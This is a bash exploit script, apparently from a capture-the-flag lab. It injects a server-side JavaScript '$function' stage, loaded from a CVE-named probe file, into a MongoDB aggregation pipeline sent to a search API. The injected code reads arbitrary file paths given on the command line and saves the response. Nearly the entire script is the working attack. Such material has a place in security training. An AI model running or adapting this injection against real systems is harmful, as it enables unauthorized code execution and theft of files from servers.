#!/usr/bin/env bash
set -o pipefail

source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"

(( $# >= 2 )) || {
  printf 'Usage: %s LABEL PATH [PATH ...]\n' "$0" >&2
  exit 2
}

label="$1"
shift
[[ "$label" =~ ^[A-Za-z0-9._-]+$ ]] || exit 2

for read_path in "$@"; do
  [[ "$read_path" =~ ^/[A-Za-z0-9._/@-]+$ ]] || exit 2
done

base='http://aegis.korvia.htb:3000/api/v1/aegis-mds/search'
template="$odyssey_root/artifacts/cve-2026-13078-multi-probe.js"
body="$odyssey_root/responses/module-multi-$label.body"
headers="$odyssey_root/responses/module-multi-$label.headers"

js_body=$(<"$template")
paths=$(jq -cn --args '$ARGS.positional' -- "$@")
pipeline=$(jq -cn --arg body "$js_body" --argjson paths "$paths" \
  '[{"$limit":1},{"$project":{
    "_id":0,
    "probe":{"$function":{"body":$body,"args":[$paths],"lang":"js"}}
  }}]')

curl --connect-timeout 5 --max-time 30 -sS -G \
  -D "$headers" -o "$body" \
  --data-urlencode "pipeline=$pipeline" "$base"

awk 'NR==1{print "status=" $2}' "$headers"
jq . "$body" 2>/dev/null || sed -n '1,240p' "$body"
